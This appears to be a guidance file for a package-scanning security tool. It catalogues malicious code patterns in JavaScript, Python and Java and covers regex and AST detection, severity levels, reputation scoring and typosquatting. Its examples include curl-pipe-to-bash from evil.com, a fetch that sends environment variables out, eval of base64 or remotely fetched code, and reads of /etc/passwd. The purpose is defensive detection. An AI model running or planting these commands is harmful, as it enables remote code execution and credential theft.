---
inclusion: always
---

# Security Patterns and Anti-Patterns

## Known Malicious Patterns by Ecosystem

### npm/JavaScript
```javascript
// CRITICAL - Remote code execution
curl http://evil.com/malware.sh | bash
wget -qO- http://evil.com/steal.js | node

// HIGH - Obfuscated execution
eval(Buffer.from('base64string', 'base64').toString())
Function(atob('base64string'))()

// MEDIUM - Suspicious network activity
require('child_process').exec('curl http://unknown-domain.tk')
fetch('http://suspicious-domain.ml/collect?data=' + process.env)
```

### Python
```python
# CRITICAL - Remote code execution
os.system("curl http://evil.com/malware.sh | bash")
subprocess.call(["wget", "-O-", "http://evil.com/steal.py"], shell=True)

# HIGH - Obfuscated execution
exec(base64.b64decode('base64string'))
eval(compile(urllib.request.urlopen('http://evil.com/code.py').read(), '<string>', 'exec'))

# MEDIUM - Suspicious file access
open('/etc/passwd', 'r').read()
os.remove('/important/file')
```

### Java
```java
// CRITICAL - Command execution
Runtime.getRuntime().exec("curl http://evil.com/malware.sh | bash");
ProcessBuilder pb = new ProcessBuilder("wget", "http://evil.com/steal.jar");

// HIGH - Reflection abuse
Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(null, "malicious");

// MEDIUM - Suspicious network
new URL("http://suspicious-domain.tk/collect").openConnection();
```

## Pattern Detection Strategy

### 1. Static Analysis (Regex)
Use for simple, well-defined patterns:
```python
CRITICAL_PATTERNS = {
    'remote_execution': r'curl\s+.*\|\s*(?:bash|sh)',
    'base64_eval': r'eval\s*\(\s*(?:atob|Buffer\.from).*base64',
    'suspicious_domains': r'\.(?:tk|ml|ga|cf|gq)\b'
}
```

### 2. AST Analysis (Recommended)
Use for complex patterns and context-aware detection:
```python
import ast

class MaliciousPatternDetector(ast.NodeVisitor):
    def visit_Call(self, node):
        # Detect os.system() calls
        if isinstance(node.func, ast.Attribute):
            if node.func.attr == 'system' and isinstance(node.func.value, ast.Name):
                if node.func.value.id == 'os':
                    self.findings.append(SecurityFinding(...))
```

### 3. LLM Analysis (For Complex Cases)
Use when:
- Code is heavily obfuscated
- Pattern is context-dependent
- Multiple suspicious indicators present
- Need natural language explanation

## Severity Classification

### Critical (Immediate Action Required)
- Remote code execution
- Credential theft
- System file modification
- Backdoor installation
- Data exfiltration

### High (Urgent Review)
- Obfuscated code execution
- Suspicious network requests
- File system manipulation
- Environment variable access
- Crypto mining

### Medium (Review Recommended)
- Unusual dependencies
- Deprecated packages
- Typosquatting attempts
- Low reputation packages
- Missing security headers

### Low (Informational)
- Outdated dependencies
- Missing best practices
- Code quality issues
- Performance concerns

## False Positive Prevention

### Common Legitimate Patterns
```python
# Legitimate: Build scripts
subprocess.run(['npm', 'install'], check=True)  # OK
subprocess.run(['python', 'setup.py', 'build'])  # OK

# Legitimate: Testing frameworks
eval('2 + 2')  # OK in test context
exec(test_code)  # OK in sandboxed test environment

# Legitimate: Development tools
os.system('git commit -m "message"')  # OK for dev tools
```

### Context Matters
- Check if code is in test files
- Verify if it's a development dependency
- Consider the package's purpose
- Look at the package's reputation

## Reputation Scoring Factors

### Package Age
- < 30 days: 🔴 High risk (new package)
- 30-90 days: 🟡 Medium risk
- 90-365 days: 🟢 Low risk
- 1+ years: ✅ Established

### Download Statistics
- < 100/week: 🔴 Very low adoption
- 100-1K/week: 🟡 Low adoption
- 1K-10K/week: 🟢 Moderate adoption
- 10K+/week: ✅ Popular

### Author History
- Unknown author: 🔴 High risk
- New author (< 1 year): 🟡 Medium risk
- Established author: 🟢 Low risk
- Verified organization: ✅ Trusted

### Maintenance
- Last update > 2 years: 🔴 Abandoned
- Last update 1-2 years: 🟡 Stale
- Last update 6-12 months: 🟢 Maintained
- Last update < 6 months: ✅ Active

## Typosquatting Detection

### Common Techniques
1. **Character Substitution**: `reqeusts` instead of `requests`
2. **Character Addition**: `requestss` instead of `requests`
3. **Character Omission**: `reqests` instead of `requests`
4. **Homoglyphs**: `requ℮sts` (using Unicode lookalikes)
5. **Hyphenation**: `req-uests` instead of `requests`

### Detection Algorithm
```python
def calculate_similarity(package1: str, package2: str) -> float:
    """Calculate Levenshtein distance similarity."""
    # Use Levenshtein distance
    # Threshold: > 0.8 similarity = potential typosquat
    pass
```

## Supply Chain Attack Indicators

### Dependency Confusion
- Package name matches internal package
- Recently published with higher version
- Minimal or no documentation
- Suspicious author

### Compromised Maintainer
- Sudden change in package behavior
- New maintainer with no history
- Unusual version bump (e.g., 1.0.0 → 99.0.0)
- Removed security features

### Malicious Update
- Version contains malicious code
- Previous versions were clean
- Rapid version releases
- Obfuscated code added

## Best Practices for Analysis

### 1. Defense in Depth
- Use multiple detection methods
- Combine static + dynamic analysis
- Verify with reputation scoring
- Cross-reference with threat intelligence

### 2. Minimize False Positives
- Consider context (test vs production)
- Check package purpose
- Verify against known good patterns
- Use confidence scoring

### 3. Actionable Findings
- Provide clear evidence
- Explain the threat
- Suggest remediation
- Include references

### 4. Performance
- Cache LLM responses
- Rate limit API calls
- Use async for I/O operations
- Implement timeouts

## References

- [npm Security Best Practices](https://docs.npmjs.com/security-best-practices)
- [PyPI Security](https://pypi.org/security/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OSV Database](https://osv.dev/)
- [Snyk Vulnerability DB](https://snyk.io/vuln/)
